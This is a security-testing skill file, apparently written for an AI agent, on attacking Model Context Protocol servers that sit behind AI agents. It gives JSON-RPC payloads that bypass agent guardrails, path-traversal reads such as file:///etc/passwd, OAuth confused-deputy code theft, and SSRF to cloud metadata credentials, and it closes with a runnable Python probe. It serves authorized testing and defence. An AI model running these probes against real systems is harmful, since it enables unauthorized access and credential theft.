---
name: hunt-agent-mcp-exposure
description: "MCP (Model Context Protocol) exposure in AI agents: direct resource access, tool enumeration, missing auth, session/Origin issues, protocol-level abuse, and the delegated-identity OAuth flows an MCP proxy runs — confused-deputy auth-code theft, token passthrough, SSRF via OAuth metadata discovery, and over-broad scopes. Bypass the agent, talk to the resource server directly, or abuse the proxy's OAuth. Verify with a value only the protected side could hold — MCP enumeration is easy to over-claim."
sources: arkx_ctf(field-validated), owasp_agentic_asi_2026, owasp_llm_top10_2025, mitre_atlas
report_count: 1
validated_against: "direct MCP resource read bypassing an 'unlock' gate (ARKX Master of Resources). Origin/session/traversal tests are REFERENCE."
---

# Hunt Agent MCP Exposure

MCP is the standard agent↔tools/resources interface. When the MCP endpoint is reachable by a client you control, you bypass the agent's guardrails and read protected resources directly. Enterprises increasingly stand up shared MCP tool servers — often with the MCP session separate from (and weaker than) the app's user auth.

## Where This Lives / Attack Surface Signals
- Agent says "connection severed / interface down" but names an endpoint.
- Headers carry `mcp-session-id`; app opens SSE/EventSource.
- Tools named `unlock_*`/`authorize_*`/`enable_*` → likely feature gates, not boundaries.
- `structured_content`, `jsonrpc`, `resource://` in traffic.
- Multi-agent → each agent may have its own MCP endpoint/resources.
- **MCP proxy fronting a third-party API** (OAuth flow present): `WWW-Authenticate` challenge, `authorization_servers`/`resource_metadata` URLs, dynamic client registration, a **static client_id** to the upstream, a consent cookie. → delegated-identity surface (Technique below).

## Crown Jewel Targets
Shared MCP servers backing multiple tenants/agents → protected resources (secrets, customer data), privileged tools (exec/write/deploy). MCP session ≠ web session = the common access-control gap.

## Characterize First
1. **Locate endpoint:** ask the agent, read errors, watch SSE/`mcp-session-id`, probe `/mcp` `/api/mcp` `/v1/mcp` `/sse` `/events`, grep JS. Transport: Streamable HTTP (POST+`mcp-session-id`) vs legacy SSE (GET→POST URL).
2. **Auth model:** is the MCP session the web session or separate? Cookie auth may not gate MCP.
3. **Protocol version:** negotiate one the server accepts (check JS if `2024-11-05` rejected). Don't hardcode.

## Methodology
```bash
# initialize — capture mcp-session-id from response headers [CONFIRMED]
-d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"r","version":"1"}}}'
# enumerate [CONFIRMED]
-d '{"jsonrpc":"2.0","id":2,"method":"resources/list","params":{}}'
-d '{"jsonrpc":"2.0","id":3,"method":"tools/list","params":{}}'
# call / read [CONFIRMED]
-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"unlock_target","arguments":{}}}'
-d '{"jsonrpc":"2.0","id":5,"method":"resources/read","params":{"uri":"resource://<target>"}}'
```
Sensitive resources: `resource://secret|key|config|admin|internal|credentials|token|env`, `file://`,`db://`,`s3://`. Dangerous tools: `unlock_*`, `read_file`, `execute/run`, `get_secret`, `write_file/deploy`.
**Auth/Origin [REFERENCE]:** no session id; fake/reused id; session from another user context; `Origin: null` / spoofed / omitted (accepted with odd Origin → any HTTP client exploits).
**Protocol-level [REFERENCE]:** `resources/read {"uri":"resource://../admin"}` / `file:///etc/passwd`; `tools/call {"name":"../admin_tool"}`; arg `__proto__` pollution.

## Delegated identity — OAuth confused deputy & token abuse [REFERENCE]
When the MCP server is a **proxy that brokers OAuth to a third-party API**, the delegation itself is the bug surface. These are named in the MCP Security Best Practices (spec rev 2025-11-25) — cite the spec, not a paraphrase:

- **Confused-deputy auth-code theft.** Trigger when the proxy uses a **static client_id** upstream, allows **dynamic client registration** (attacker registers their own `client_id` + `redirect_uri`), and the upstream **sets a consent cookie**. After a victim consents once, an attacker link reuses that cookie → consent screen skipped → the MCP auth code redirects to the attacker's `redirect_uri` → attacker exchanges it for a token and acts as the user. Test: register a client with an attacker `redirect_uri`; send the victim a crafted `/authorize` link; see if consent is skipped and the code lands on your URI. (CWE-441.)
- **Token passthrough.** The proxy accepts a token **not issued to it** and forwards it downstream. Test whether a token minted for another audience is accepted → bypasses the server's rate-limit/audience/authz controls and breaks the audit trail. Spec: servers **MUST NOT** accept tokens not explicitly issued for them.
- **SSRF via OAuth metadata discovery.** A malicious/attacker-influenced server populates `resource_metadata` / `authorization_servers` / `token_endpoint` with `http://169.254.169.254/…` or an internal URL the client fetches during discovery → cloud IMDS creds / internal recon. Chain to `hunt-agent-tool-injection` / `hunt-agent-blind-exfil` (OOB); test private/link-local ranges, DNS-rebinding, redirect chains.
- **Over-broad / omnibox scopes.** Server advertises every scope in `scopes_supported` and the client requests them all → a stolen token has maximal blast radius. Report scope inflation + no progressive elevation.
- **Session ≠ auth.** Spec: MCP servers **MUST NOT** use sessions for authentication and MUST bind session ids to a server-side user id (`<user_id>:<session_id>`) — a guessable/reused session id that authorizes actions is the finding (see Auth/Origin above).

`Research anchor:` **MCP-SafetyBench** (Xuanjun Zong et al., arXiv:2512.15163) found **host-side attacks the most effective at 81.94% avg ASR**, and **Identity Injection / Spoofing succeeds 100% across all 13 tested models** — "a universal vulnerability" in how agents verify the source/privilege of a request (§4.2, Table 10). That is the empirical backing for this whole identity/session section: agents do not authenticate the *caller* of an MCP request, so a spoofed identity or reused session is honoured. Quote the 100% when reporting a missing per-request identity check.

## Verification & False-Positive Gate
1. **Enumeration ≠ impact** — names in `resources/list` = at most MEDIUM. Finding = **read of protected data** or **privileged tool action**; show the artifact.
2. **Verify the value** (submit/authenticate) — servers can return stubs.
3. **Prove the bypass matters** — if the same data is reachable via the agent UI, direct MCP read isn't an access-control bypass.
4. **Cross-tenant needs a verifiable artifact** tied to another account (record id/email), not "some data came back."
5. **Reproduce ≥3×**, pin exact session/headers. 6. **Missing-auth = show the successful no-auth request/response.** **Min-necessary extraction.**
7. **Self-description untrusted** — the agent naming the endpoint doesn't mean it's the only one; enumerate.
8. **OAuth findings need the completed effect** — confused-deputy = the auth code actually lands on YOUR `redirect_uri` and exchanges for a working token (do it against your own second account); token-passthrough = a wrong-audience token actually accepted downstream; metadata-SSRF = an OOB callback from the client (169.254.169.254 or your listener). A skipped-consent screen alone, or a token the server *might* accept, is not yet the finding.

### Negative-Result Gate (before reporting "clean")
A probe that reports clean because it never looked is the more common failure, and it reaches the
client as "we tested it and found nothing". Before any negative:
1. **A control proves the probe could fire** — plant a known-true case, see it detected in the same run.
2. **Denylist read-only tools; never allowlist the dangerous ones** — an allowlist ignores what it has not heard of.
3. **Errors are their own verdict** — 5xx / timeout / empty read = UNMEASURABLE, never "refused".
4. **Prove the plant persisted** before reporting isolation — no memory to cross means no result.
5. **Tokenise identifiers at ONE character** — ids are routinely a single digit.
6. **Word boundaries; normalise whitespace before subtracting** — substrings invent findings, verbatim matching deletes them.
7. **A fixed-size effect is not proof; a SCALING one is** — constant overhead is an extra model turn, not execution.
8. **Judge tuning by whether a GENUINE detection dropped**, not by the false-positive count.
9. **Do not inherit another tool's verdict** — benchmarks and scanners carry their own bugs.

## Common Root Causes
MCP resources are client-readable by design; "unlock" tools are convenience gates; endpoint disclosed by the agent; MCP session ≠ web session / no auth; loose Origin validation; no resource-level authz; predictable/reusable session ids. **Delegated-identity roots:** a proxy with a static upstream client_id + dynamic registration + consent cookie and no per-client consent (confused deputy); accepting tokens not issued to the server (passthrough); fetching OAuth-metadata URLs without SSRF guards; publishing/requesting omnibus scopes; using sessions for authentication.

## Impact & Severity
- **CRITICAL:** confused-deputy auth-code theft yielding a working third-party token (account takeover of the user's connected service), or metadata-SSRF returning cloud IMDS credentials.
- **HIGH:** direct read of protected resources / privileged tool call bypassing agent controls; command exec via an MCP tool (→ tool-injection); token-passthrough accepted downstream.
- **MEDIUM:** enumeration; verifiable session hijack; over-broad scope with no elevation. **LOW:** tool enumeration only.

## Mapping
- OWASP Agentic Apps (ASI, 2026): **ASI03 Identity & Privilege Abuse** (delegated-identity/OAuth) + **ASI02 Tool Misuse** (resource access-control failure) — primary homes. OWASP LLM: **LLM06:2025 Excessive Agency (= LLM03:2026) + LLM02**. OWASP Agentic Threats v1.1: **T3 Privilege Compromise**, **T9 Identity Spoofing**, **T16 Insecure Inter-Agent Protocol Abuse**. MITRE ATLAS (v5.6.0) **AML.T0053 AI Agent Tool Invocation**; **AML.T0055 Unsecured Credentials** for token abuse. CWE-284 / 306 / **441 (confused deputy)** / **918 (SSRF)** / 863. Spec: MCP Security Best Practices, rev 2025-11-25.

## Enumerate, then READ — listing is not auditing [CONFIRMED]
Three failure modes, each of which hid a real credential store in testing:

1. **Listing resources is not reading them.** `resources/list` returns URIs and names; the secrets
   are in the CONTENT. Read each resource you are allowed to read.
2. **Generic arguments never name the poisoned object.** A document-reading tool called with
   `{"document_name": "test"}` returns nothing interesting. Enumerate real names first (from a
   `documents://list`-style resource, or the tool's own listing) and replay them into the tool.
3. **Narrow secret patterns miss real keys.** Matching only `api_key:` / `sk-…` shapes misses the
   vendor-prefixed tokens most platforms actually issue.

`Field example:` a sweep of 10 DVMCP challenge servers surfaced `internal://credentials` and
`system://secrets` on four of them once resources were READ rather than listed. Challenge 6's
`internal_memo.txt` held live-format production keys (`api_prod_…`, `pg_live_…`, `as_prod_…`) that a
`key\s*[:=]` pattern skipped entirely; widening to `[a-z]{2,6}[_-](prod|live|test|dev)[_-][A-Za-z0-9]{10,}`
caught them while still not flagging benign weather/announcement text. — DVMCP, local, 2026-09-12.

## Runnable Probe [self-contained]
```python
#!/usr/bin/env python3
# Talk to the MCP endpoint DIRECTLY (bypass the agent): initialize, enumerate resources+tools, and
# attempt to read a sensitive resource with NO agent-side guardrail. Handles Streamable-HTTP and the
# mcp-session-id handshake. deps: stdlib only.
import json, urllib.request
URL = "https://target/mcp"
def rpc(method, params, sid=None, _id=1):
    h = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    if sid: h["mcp-session-id"] = sid
    r = urllib.request.Request(URL, data=json.dumps(
        {"jsonrpc": "2.0", "id": _id, "method": method, "params": params}).encode(), headers=h, method="POST")
    resp = urllib.request.urlopen(r, timeout=30)
    return resp.headers.get("mcp-session-id"), resp.read().decode("utf-8", "replace")

for ver in ("2025-06-18", "2024-11-05"):                       # negotiate a version it accepts
    try:
        sid, out = rpc("initialize", {"protocolVersion": ver, "capabilities": {},
                                      "clientInfo": {"name": "probe", "version": "1"}}); break
    except Exception as e: print(f"[ ] {ver} rejected: {e}")
if not sid:
    print("[ERROR] no mcp-session-id returned — the endpoint did not initialize. Nothing below is"
          " a result: an unreachable server and a hardened one look identical here."); raise SystemExit(1)
print(f"[+] initialized, session={sid}")
print("[resources]", rpc("resources/list", {}, sid, 2)[1][:400])
print("[tools]    ", rpc("tools/list", {}, sid, 3)[1][:400])
for uri in ("resource://secret", "resource://config", "resource://credentials", "file:///etc/passwd"):
    try: print(f"[read {uri}]", rpc("resources/read", {"uri": uri}, sid, 4)[1][:200])
    except Exception as e: print(f"[read {uri}] {e}")
# LETHAL WHEN: a protected resource / privileged tool result comes back with a VERIFIABLE value
# (authenticates, or provably another tenant's) that the agent UI gates — direct MCP access with no
# auth. Enumeration of names alone is at most MEDIUM. (OAuth confused-deputy: see the technique above.)
```

## Related Skills
`hunt-agent-tool-injection` (metadata-SSRF → IMDS, MCP-tool RCE) · `hunt-agent-mcp-supply-chain` (poisoned tool descriptions — the content sibling of this transport/auth skill) · `hunt-agent-config-poisoning` (`.mcp.json` write-to-execute) · `hunt-agent-multi-agent` (incl. A2A) · `hunt-agent-blind-exfil` (OOB-confirm the metadata-SSRF) · `hunt-agent-prompt-extraction` · `ai-agent-methodology` · `redteam-mindset`
